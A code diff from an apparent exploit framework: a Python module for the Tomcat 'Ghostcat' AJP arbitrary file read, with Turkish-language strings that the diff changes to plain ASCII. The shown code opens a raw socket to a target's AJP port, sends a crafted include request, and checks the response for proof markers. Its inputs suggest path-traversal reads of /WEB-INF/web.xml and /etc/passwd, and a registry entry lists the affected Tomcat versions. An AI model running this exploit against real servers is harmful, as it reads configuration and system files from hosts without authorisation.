@@ -98,7 +98,7 @@ def ghostcat(params) -> dict:
     try:
         sk = socket.create_connection((host, int(port)), timeout=12)
     except Exception as e:
-        return {"ok": False, "success": False, "error": f"AJP bağlantı hatası: {e}", "log": log}
+        return {"ok": False, "success": False, "error": f"AJP baglanti hatasi: {e}", "log": log}
     try:
         sk.sendall(_build_ajp(include, servlet_path, context_path))
         data = _recv(sk, timeout=12)
@@ -111,7 +111,7 @@ def ghostcat(params) -> dict:
     markers = [marker] if marker else _RCE_MARKERS
     success = bool(marker and marker in txt) or any(m in txt for m in _RCE_MARKERS)
     if len(data) == 0:
-        log.append("AJP yanıtı boş — AJP kapalı mı, secretRequired mı, veya sürüm patched (>=9.0.31/8.5.51/7.0.100)?")
+        log.append("AJP yaniti bos — AJP kapali mi, secretRequired mi, veya surum patched (>=9.0.31/8.5.51/7.0.100)?")
         success = False
     log.append(f"resp_bytes={len(data)} status={res['status']} success={success}")
     return {
@@ -137,7 +137,7 @@ _INPUTS = [
     _in("Okunacak dosya", "file", False, "/WEB-INF/web.xml", "/WEB-INF/web.xml | ../../../../../etc/passwd"),
     _in("servlet_path", "servlet_path", False, "/index.jsp", "/index.jsp"),
     _in("context_path", "context_path", False, "/", "/"),
-    _in("Kanıt (ops.)", "marker", False, "", "web-app | root:x:0:0"),
+    _in("Kanit (ops.)", "marker", False, "", "web-app | root:x:0:0"),
 ]
 
 
@@ -146,10 +146,10 @@ EXPLOITS = {
         "name": "Tomcat Ghostcat — AJP arbitrary file read",
         "type": "FileRead", "preauth": True,
         "affected": ["7.0.x<7.0.100", "8.5.x<8.5.51", "9.0.x<9.0.31"],
-        "note": ("Native AJP/1.3 (raw socket): javax.servlet.include.* attribute'ları ile Tomcat'i "
-                 "keyfi dosyayı include etmeye zorlar. Kanıt = dosyanın gerçek byte'ları "
-                 "(WEB-INF/web.xml, MANIFEST, /etc/passwd). AJP 8009 açık + secretRequired=false "
-                 "(pre-9.0.31/8.5.51/7.0.100) hedefte çalışır."),
+        "note": ("Native AJP/1.3 (raw socket): javax.servlet.include.* attribute'lari ile Tomcat'i "
+                 "keyfi dosyayi include etmeye zorlar. Kanit = dosyanin gercek byte'lari "
+                 "(WEB-INF/web.xml, MANIFEST, /etc/passwd). AJP 8009 acik + secretRequired=false "
+                 "(pre-9.0.31/8.5.51/7.0.100) hedefte calisir."),
         "inputs": list(_INPUTS),
         "run": ghostcat,
     },
